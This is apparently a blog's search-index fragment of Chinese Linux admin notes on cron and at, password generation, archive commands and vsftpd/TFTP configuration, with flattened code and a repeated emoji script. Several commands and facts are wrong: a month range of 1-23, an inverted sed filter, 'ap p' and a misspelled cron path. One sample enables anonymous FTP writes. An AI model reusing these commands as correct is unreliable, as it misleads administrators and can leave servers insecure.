Server&#x4FEE;&#x6539;Windows&#x955C;&#x50CF; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux计划任务实现","date":"2022-06-07T04:37:20.000Z","path":"/posts/2fe5fc07/","text":"crontab &#x63D0;&#x4EA4;&#x548C;&#x7BA1;&#x7406;&#x7528;&#x6237;&#x7684;&#x9700;&#x8981;&#x5468;&#x671F;&#x6027;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1; 12345678# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed 12# crontab&#x4EFB;&#x52A1;&#x683C;&#x5F0F;minute hour day month week command &#x987A;&#x5E8F;&#xFF1A;&#x5206; &#x65F6; &#x65E5; &#x6708; &#x5468; &#x8BF4;&#x660E;&#xFF1A; minute: &#x8868;&#x793A;&#x5206;&#x949F;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x4ECE;0&#x5230;59&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570; hour: &#x8868;&#x793A;&#x5C0F;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x4ECE;0&#x5230;23&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570; day: &#x8868;&#x793A;&#x65E5;&#x671F;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;1-31&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570; month: &#x8868;&#x793A;&#x6708;&#x4EFD;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;1-23&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x82F1;&#x6587; week: &#x8868;&#x793A;&#x661F;&#x671F;&#x51E0;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;0-7&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;&#xFF0C;&#xFF08;0&#x548C;7&#x4EE3;&#x8868;&#x661F;&#x671F;&#x65E5;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x82F1;&#x6587; command: &#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x81EA;&#x5DF1;&#x7F16;&#x5199;&#x7684;&#x811A;&#x672C; &#x661F;&#x53F7;(*) : &#x4EE3;&#x8868;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x7684;&#x503C;&#xFF0C;&#x4F8B;&#x5982;month&#x5B57;&#x6BB5;&#x5982;&#x679C;&#x662F;&#x661F;&#x53F7;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x5728;&#x6EE1;&#x8DB3;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x5236;&#x7EA6;&#x6761;&#x4EF6;&#x540E;&#x6BCF;&#x6708;&#x90FD;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x7684;&#x64CD;&#x4F5C; &#x9017;&#x53F7;(,)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#x7684;&#x503C;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5217;&#x8868;&#x8303;&#x56F4;&#xFF0C;&#x4F8B;&#x5982;1,2,4,7,9 &#x4E2D;&#x6760;(-)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x6574;&#x6570;&#x4E4B;&#x95F4;&#x7684;&#x4E2D;&#x6760;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x8303;&#x56F4;&#xFF0C;&#x4F8B;&#x5982;2-6&#x8868;&#x793A;2,3,4,5,6 &#x6B63;&#x659C;&#x7EBF;(/)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x6B63;&#x659C;&#x7EBF;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x7684;&#x95F4;&#x9694;&#x9891;&#x7387;&#xFF0C;&#x4F8B;&#x5982;0-23/2&#x8868;&#x793A;&#x6BCF;&#x4E24;&#x4E2A;&#x5C0F;&#x65F6;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;&#x901A;&#x77E5;&#x6B63;&#x659C;&#x7EBF;&#x53EF;&#x4EE5;&#x548C;&#x661F;&#x53F7;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4F8B;&#x5982;*/10&#xFF0C;&#x5728;minute&#x5B57;&#x6BB5;&#x8868;&#x793A;&#x6BCF;&#x5341;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21; 1234567891011121314151617181920212223242526272829303132333435363738394041# &#x6BCF;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;* * * * * command# &#x6BCF;&#x5C0F;&#x65F6;&#x7684;&#x7B2C;&#x4E09;&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;3,15 * * * * command# &#x5728;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;3,15 8-11 * * * command# &#x6BCF;&#x9694;&#x4E24;&#x5929;&#x7684;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;3,15 8-11 */2 * * command# &#x6BCF;&#x4E2A;&#x661F;&#x671F;&#x4E00;&#x7684;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;3,15 8-11 * * 1 command# &#x6BCF;&#x665A;21:30&#x91CD;&#x542F;smb30 21 * * * /etc/init.d/smb restart# &#x6BCF;&#x6708;1&#x3001;10&#x3001;22&#x65E5;&#x7684;4:45&#x91CD;&#x542F;smb45 4 1,10,22 * * /etc/init.d/smb restart# &#x6BCF;&#x5468;&#x516D;&#xFF0C;&#x5468;&#x65E5;&#x7684;1:10&#x91CD;&#x542F;smb10 1 * * 6,7(&#x6216;&#x8005;6,0) /etc/init.d/smb restart# &#x6BCF;&#x5929;18:00&#x81F3;23:00&#x4E4B;&#x95F4;&#x6BCF;&#x9694;30&#x5206;&#x949F;&#x91CD;&#x542F;smb*/30(0,30) 18-23 * * * /etc/init.d/smb restart# &#x6BCF;&#x5468;&#x516D;&#x7684;&#x665A;&#x4E0A;11&#x91CD;&#x542F;smb0 23 * * 6 /etc/init.d/smb restart# &#x6BCF;&#x5C0F;&#x65F6;&#x91CD;&#x542F;smb* */1 * * * /etc/init.d/smb restart# &#x6BCF;&#x6708;4&#x53F7;&#x4E0E;&#x6BCF;&#x5468;&#x4E00;&#x5230;&#x5468;&#x4E09;&#x7684;11&#x70B9;&#x91CD;&#x542F;smb0 11 4 * 1-3(mon-wed) /etc/init.d/smb restart# &#x4E00;&#x6708;&#x4E00;&#x53F7;&#x7684;4&#x70B9;&#x91CD;&#x542F;smb0 4 1 jan * /etc/init.d/smb restart# &#x6BCF;&#x5C0F;&#x65F6;&#x6267;&#x884C;/etc/cron.hourly&#x76EE;&#x5F55;&#x5185;&#x7684;&#x811A;&#x672C;01 * * * * root run-parts /etc/con.hourly at &#x5728;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1; 1234567891011# &#x4E09;&#x5929;&#x540E;&#x7684;&#x4E0B;&#x5348;5&#x70B9;&#x949F;&#x6267;&#x884C;/bin/lsat 5pm+3 daysat&gt; /bin/lsat&gt; &lt;EOT&gt;Ctrl+D# &#x660E;&#x5929;17&#x70B9;&#x949F;&#xFF0C;&#x8F93;&#x51FA;&#x65F6;&#x95F4;&#x5230;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x5185;&#xFF1A;at 17:20 tomorrowat&gt; date &gt;/root/2022.logat&gt; &lt;EOT&gt;Ctrl+D atq &#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x6267;&#x884C;&#x5DE5;&#x4F5C;&#x4EFB;&#x52A1; atrm x &#x5220;&#x9664;&#x4EFB;&#x52A1;x at -c x &#x67E5;&#x770B;&#x5DF2;&#x7ECF;&#x8BBE;&#x7F6E;&#x7684;&#x4EFB;&#x52A1;&#x5185;&#x5BB9; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux登录退出提示信息欢迎信息","date":"2022-06-07T04:37:10.000Z","path":"/posts/e025952a/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux生成随机密码方法","date":"2022-06-07T04:36:47.000Z","path":"/posts/b3f64b7d/","text":"gpg&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;123456# gpg --gen-random --armor 2 12# --gen-random &#x968F;&#x673A;&#x751F;&#x6210;&#x5B57;&#x7B26;# -armor &#x751F;&#x6210;ASCII&#x5B57;&#x7B26;# 2 &#x8D28;&#x91CF;&#x7EA7;&#x522B;&#xFF0C;0&#x3001;1&#x3001;2&#x4E09;&#x4E2A;&#x9009;&#x9879;# 12 &#x5B57;&#x7B26;&#x957F;&#x5EA6; &#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;1gpg --gen-random --armor 2 12 | sed &apos;s/[^a-zA-Z0-9]//g&apos; &#x68C0;&#x6D4B;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6; &#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B89;&#x88C5;cracklib&#x5DE5;&#x5177;&#x6765;&#x68C0;&#x67E5;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6; 123yum install cracklibecho &quot;123545&quot; | cracklib-check openssl&#x751F;&#x6210;&#x968F;&#x673A;&#x5B57;&#x7B26;1openssl rand -base64 15 &#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;1openssl rand -base64 15 | sed &apos;s/[a-zA-Z0-9]//g&apos; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux的归档与解压缩","date":"2022-06-07T04:36:30.000Z","path":"/posts/1e844aa4/","text":"Linux&#x89E3;&#x538B;&#x7F29;&#x5DE5;&#x5177;&#xFF08;&#x547D;&#x4EE4;&#xFF09; tar &#x3001;gzip&#x3001;bzip2&#x3001;zip&#x3001;xz&#x3001;gunzip&#x3001; tar123456789-c &#x521B;&#x5EFA;&#x6253;&#x5305;-x &#x5C55;&#x5F00;&#x5F52;&#x6863;&#x6587;&#x4EF6;-v &#x663E;&#x793A;&#x8FC7;&#x7A0B;&#x4FE1;&#x606F;-f &#x6307;&#x5B9A;&#x6587;&#x4EF6;/&#x76EE;&#x5F55;-O &#x5C06;&#x6587;&#x4EF6;&#x89E3;&#x5F00;&#x5230;&#x6807;&#x51C6;&#x8F93;&#x51FA;-C &#x6307;&#x5B9A;&#x8DEF;&#x5F84;-j bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;-J xz&#x683C;&#x5F0F;&#x6587;&#x4EF6;-z gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6; &#x89E3;&#x5305;&#xFF1A;tar -xvf filename.tar&#x6253;&#x5305;&#xFF1A;tar -cvf filename.tar gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;123456tar -zxvf filename.tar.gz # &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x538B;&#x7F29;&#x6587;&#x4EF6;tar -zcvf filename.tar.gz compress_dir # &#x521B;&#x5EFA;gzip&#x683C;&#x5F0F;&#x538B;&#x7F29;&#x6587;&#x4EF6;################################33gunzip filename.gz # &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;gzip -d filename.gz # &#x89E3;&#x538B;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6;gzip filename.gz # &#x521B;&#x5EFA;gzip&#x683C;&#x5F0F;&#x6587;&#x4EF6; bz1234bzip2 -d filename.bz # &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;bunzip2 filename.bz # &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6;################3tar jxvf # &#x89E3;&#x538B;bz&#x683C;&#x5F0F;&#x6587;&#x4EF6; bz2123456bzip2 -d filename.bz2 # &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;bunzip2 filename.bz2 # &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;bzip2 -z filename # &#x521B;&#x5EFA;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;####################tar jxvf filename.tar.bz2 # &#x89E3;&#x538B;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6;tar jcvf file_dir # &#x521B;&#x5EFA;bz2&#x683C;&#x5F0F;&#x6587;&#x4EF6; z12345uncompress filename.z # &#x89E3;&#x538B;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;compress filename # &#x521B;&#x5EFA;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;##################tar Zxvf # &#x89E3;&#x538B;z&#x683C;&#x5F0F;&#x6587;&#x4EF6;tar Zcvf # &#x521B;&#x5EFA;z&#x683C;&#x5F0F;&#x6587;&#x4EF6; zip12unzip filename.zip # &#x89E3;&#x538B;zip&#x6587;&#x4EF6;zip filename.zip file_dir # &#x521B;&#x5EFA;zip&#x6587;&#x4EF6; rpm&#x5305;&#x7684;&#x89E3;&#x5305;1rpm2cpio filename.rpm | cpio -div deb&#x5305;&#x7684;&#x89E3;&#x5305;1ap p filename.deb data.tar.gz | tar zxvf - document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux命令","date":"2022-06-07T04:36:17.000Z","path":"/posts/82734d8/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"LDAP的配置与管理","date":"2022-06-07T04:36:07.000Z","path":"/posts/7733d98/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"FTP/TFTP的配置与管理","date":"2022-06-07T04:35:55.000Z","path":"/posts/9d56e705/","text":"TFTP &#x7B80;&#x5355;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE; &#x5B89;&#x88C5;1yum install tftp-server tftp xinetd &#x914D;&#x7F6E;12vim /etc/xinetd.d/ftpdisable = no tftp&#x670D;&#x52A1;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x5B58;&#x653E;&#x76EE;&#x5F55;/var/lib/tftpboot/ FTP Server&#x7B80;&#x5355;&#x914D;&#x7F6E; /etc/vsftpd/vsftpd.conf # ftp&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/vsftpd/ftpusers # ftp&#x9ED1;&#x540D;&#x5355;/etc/vsftpd/user_list #&#x767D;&#x540D;&#x5355;/var/ftp ftp&#x9ED8;&#x8BA4;&#x6839;&#x76EE;&#x5F55; &#x5B89;&#x88C5;1yum install -y vsftp lftp &#x533F;&#x540D;&#x8BBF;&#x95EE;FTP&#x914D;&#x7F6E;&#x793A;&#x4F8B;1234567891011121314151617# &#x542F;&#x7528;&#x533F;&#x540D;&#x8BBF;&#x95EE;anonymous_enable=YES# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0A;&#x4F20;anon_upload_enable=YES# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x76EE;&#x5F55;anon_mkdir_write_enable=YES# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4FEE;&#x6539;anon_other_write_enable=YESlocal_enable=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YES &#x591A;&#x7528;&#x6237;FTP &#x5173;&#x95ED;&#x533F;&#x540D;&#x8BBF;&#x95EE; 1234vim /etc/vsftpd/vsftpd.confanonymous_enable=NO...anon_other_write_enable=NO &#x6DFB;&#x52A0;FTP&#x7528;&#x6237;12useradd -s /sbin/nologin ftp_user1useradd -s /sbin/nologin ftp_user2 &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6; 123456789101112vim /etc/vsftpd/vsftpd.confchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listallow_writeable_chroot=YESlocal_enable=YEStouch /etc/vsftpd/chroot_listvim /etc/vsftpd/chroot_listftp_user1ftp_user2 &#x793A;&#x4F8B;1234567891011121314151617anonymous_enable=NOanon_upload_enable=YESanon_mkdir_write_enable=YESanon_other_write_enable=NOlocal_root=/var/www/htmlchroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listallow_writeable_chroot=YESlocal_enable=YESlocal_umask=022write_enable=YESdirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=YES#listen_ipv6=NO FTP&#x865A;&#x62DF;&#x7528;&#x6237; https://access.redhat.com/solutions/54295&#x521B;&#x5EFA;FTP&#x767B;&#x5F55;&#x7528;&#x6237; 123456vim /etc/vsftpd/login.txtuser1user1_passwduser2user2_passwd &#x5C06;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x8F6C;&#x6362;&#x4E3A;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6; 1db_load -T -t hash -f /etc/vsftpd/login.txt /etc/vsftpd/login.db &#x9700;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x6743;&#x9650; 1chmod 0600 /etc/vsftpd/login.db &#x66F4;&#x65B0;vsftpd pam&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234vim /etc/pam.d/vsftpd# &#x5982;&#x679C;&#x4F60;&#x5141;&#x8BB8;ftp&#x865A;&#x62DF;yoghurt&#x8BBF;&#x95EE;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x5176;&#x5B83;&#x7684;&#x5185;&#x5BB9;&#x90FD;&#x6CE8;&#x91CA;&#x6389;auth required pam_userdb.so db=/etc/vsftpd/loginaccount required pam_userdb.so db=/etc/vsftpd/login &#x4E3A;&#x865A;&#x62DF;&#x7528;&#x6237;&#x521B;&#x5EFA;&#x4E3B;&#x76EE;&#x5F55; 123mkdir /home/ftpmkdir -p /home/ftp/{user1,user2}chown -R ftp:ftp /home/ftp &#x4FEE;&#x6539;vsftpd&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234567vim /etc/vsftpd/vsftpd.conf# &#x589E;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570;guest_enable=YESguest_username=virtftpuser_sub_token=$USERlocal_root=/home/ftp/$USERchroot_local_user=YES # &#x5F3A;&#x5236;&#x865A;&#x62DF;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6; &#x521B;&#x5EFA;virtftp&#x7528;&#x6237; 1useradd -d /var/ftp -M -s /sbin/nologin virtftp &#x521B;&#x5EFA;ftp&#x865A;&#x62DF;&#x7528;&#x6237;&#x914D;&#x7F6E;&#x6587;&#x4EF6; 1234567891011vim /etc/vsftpd/vsftpd.conf# &#x6DFB;&#x52A0;user_config_dir=/etc/vsftpd/vsftpd_user_confmkdir /etc/vsftpd/vsftpd_user_confecho &quot;anon_world_readable_only=NO&quot; &gt; /etc/vsftpd/vsftpd_user_conf/user1vim /etc/vsftpd/vsftpd_user_conf/user2anon_world_readable_only=NOwrite_enable=YESanon_upload_enable=YES vsftpd.conf&#x53C2;&#x6570;&#x8BF4;&#x660E; &#x539F;&#x6587; http://vsftpd.beasts.org/vsftpd_conf.html#index NAMEvsftpd.conf - vsftpd&#x914D;&#x7F6E;&#x6587;&#x4EF6; DESCRIPTION vsftpd.conf &#x7528;&#x4E8E;&#x63A7;&#x5236;vsftpd&#x884C;&#x4E3A;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;vsftpd&#x5728;/etc/vsftpd.conf &#x4F4D;&#x7F6E;&#x67E5;&#x627E;&#x6B64;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x60A8;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;vsftpd&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x6765;&#x8986;&#x76D6;&#x5B83;&#x3002; FORMAT vsftpd.conf &#x7684;&#x683C;&#x5F0F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x6BCF;&#x884C;&#x8981;&#x4E48;&#x662F;&#x6CE8;&#x91CA;&#xFF0C;&#x8981;&#x4E48;&#x662F;&#x6307;&#x4EE4;&#x3002;&#x6CE8;&#x91CA;&#x884C;&#x4EE5;# &#x5F00;&#x5934;&#x5E76;&#x88AB;vsftpd&#x5FFD;&#x7565;&#x3002; options=value &#x9009;&#x9879;=&#x503C;&#x6CE8;&#x610F;&#xFF01;&#x5728;&#x6BCF;&#x4E2A;=&#x548C;&#x5DE6;&#x53F3;&#x4E0D;&#x80FD;&#x6709;&#x7A7A;&#x683C; &#x5E03;&#x5C14;&#x9009;&#x9879; &#x4E0B;&#x9762;&#x662F;Boolean&#x9009;&#x9879;&#x5217;&#x8868;&#x3002;&#x5E03;&#x5C14;&#x9009;&#x9879;&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;YES&#x6216;NO allow_anon_ssl&#x53EA;&#x6709;ssl_enable=YES&#x65F6;&#x624D;&#x9002;&#x7528;&#x3002;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;YES&#xFF0C;&#x533F;&#x540D;&#x7528;&#x6237;&#x5C06;&#x88AB;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x5B89;&#x5168;&#x7684;SSL&#x8FDE;&#x63A5;&#x3002; - &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO anon_mkdir_write_enable &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;YES&#xFF0C;&#x5C06;&#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#x521B;&#x5EFA;&#x65B0;&#x76EE;&#x5F55;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x6FC0;&#x6D3B;write_enable&#xFF0C;&#x5E76;&#x4E14;ftp&#x533F;&#x540D;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x5BF9;&#x7236;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x5199;&#x6743;&#x9650; - &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO anon_other_write_enable# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x88AB;&#x6267;&#x884C;&#x9664;&#x4E0A;&#x4F20;&#x548C;&#x521B;&#x5EFA;&#x76EE;&#x5F55;&#x4E4B;&#x5916;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x5220;&#x9664;&#x548C;&#x91CD;&#x547D;&#x540D; anon_upload_enable# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x5728;write_enable&#x6FC0;&#x6D3B;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#x3002;&#x5E76;&#x4E14;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0A;&#x4F20;&#x4F4D;&#x7F6E;&#x5177;&#x6709;&#x5199;&#x5165;&#x6743;&#x9650;# &#x865A;&#x62DF;&#x7528;&#x6237;&#x4E0A;&#x4F20; &#x4E5F;&#x9700;&#x8981;&#x6B64;&#x8BBE;&#x7F6E;&#xFF1B;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x865A;&#x62DF;&#x7528;&#x6237;&#x5177;&#x6709;&#x533F;&#x540D;&#xFF08;&#x5373;&#x6700;&#x5927;&#x9650;&#x5236;&#xFF09;&#x6743;&#x9650; &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;NO anon_world_readable_only# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x4E0B;&#x8F7D;&#x53EF;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#xFF08;&#x4E0D;&#x80FD;&#x5728;ftp&#x4E2D;&#x6253;&#x5F00;&#xFF09; &#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES anonymous_enable# &#x5141;&#x8BB8;&#x533F;&#x540D;&#x7528;&#x6237;&#x767B;&#x5F55;&#xFF0C;&#x9ED8;&#x8BA4;&#x7528;&#x6237;&#x540D;&#xFF1A;ftp &#x3001;anonymous&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES ascii_download_enable# &#x4E0B;&#x8F7D;&#x65F6;&#x91C7;&#x7528;ASCII&#x6A21;&#x5F0F;&#x4F20;&#x8F93;&#x6570;&#x636E; ascii_upload_enable# &#x4E0A;&#x4F20;&#x65F6;&#x63A5;&#x6536;ASCII&#x6A21;&#x5F0F;&#x6570;&#x636E;&#x4F20;&#x8F93; async_abor_enable# &#x542F;&#x7528;async ABOR &#x7279;&#x6B8A;FTP&#x547D;&#x4EE4;&#x3002;&#x4E0D;&#x5EFA;&#x8BAE;&#x542F;&#x7528; background# FTP&#x4EE5;listen&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#xFF0C; check_shell# &#x8BE5;&#x9009;&#x9879;&#x4EC5;&#x5BF9;&#x975E;PAM&#x6784;&#x5EFA;&#x7684;vsftpd&#x6709;&#x6548;&#x3002;&#x5982;&#x679C;&#x7981;&#x7528;&#xFF0C;vsftpd&#x5C06;&#x4E0D;&#x4F1A;&#x68C0;&#x67E5;/etc/shell&#x4EE5;&#x83B7;&#x53D6;&#x672C;&#x5730;&#x767B;&#x5F55;&#x7684;&#x6709;&#x6548;&#x7528;&#x6237;shell&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES chmod_enable# &#x5141;&#x8BB8;&#x4F7F;&#x7528;SITE CHMOD&#x547D;&#x4EE4;&#x3002;&#x4EC5;&#x4F7F;&#x7528;&#x4E0E;&#x672C;&#x5730;&#x7528;&#x6237;&#x3002;&#x533F;&#x540D;&#x7528;&#x6237;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;SITE CHMOD&#x3002;&#x9ED8;&#x8BA4;&#x503C;&#xFF1A;YES chown_uploads# 